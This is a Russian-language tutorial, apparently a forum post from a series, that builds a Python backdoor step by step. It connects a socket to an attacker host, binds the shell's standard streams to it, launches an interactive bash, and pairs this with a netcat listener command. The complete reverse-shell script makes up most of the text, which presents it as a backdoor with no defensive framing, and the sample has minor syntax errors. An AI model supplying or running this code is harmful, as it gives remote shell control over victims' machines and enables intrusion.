Что же, сегодня нам понадобятся 3 следующие библиотеки:
Socket
Subprocess
OS
С библиотекой socket, мы уже познакомились в прошлой части, а теперь немного про остальные 2-е.
Subprocess - запускает определенные(заданные вами) процессы.
OS - это модуль, который предназначен для работы с операционной системой.
И так, подключаем данные модули:
Python:
	
	
import subprocess
import socket
import os


Далее создаем сокет и осуществляем подключение:
Python:
	
	
host = "имя сервера"
port = порт

sock = socket.socket()
sock.connect((host, port))
А теперь не мало важная часть. Это - потоки ввода данных. Наша задача, привязать потоки данных к нашей серверной части.


Python:
os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)


И конечно же даем доступ к shell'у(командной оболочке):
Код:
	
	
subprocess.call(["bash","-i"])
В итоге получаем backdoor, который получает доступ по принципу Reverse Shell

Python:
	
	
import subprocess
import socket
import os

host = 192.168.1.X # server name
port = 9191 #ясно дело порт )

sock = socket.socket()
sock.connect((host, port))

os.dup2(sock.fileno(),0)
os.dup2(sock.fileno(),1)
os.dup2(sock.fileno(),2)

subprocess.call(["bash", "-i"])


Далее, на атакующей машине остается только запустить сервер. Это делается просто - netcat.
Пропишем следующую команду:
Код:
	
nc -nlvp <порт>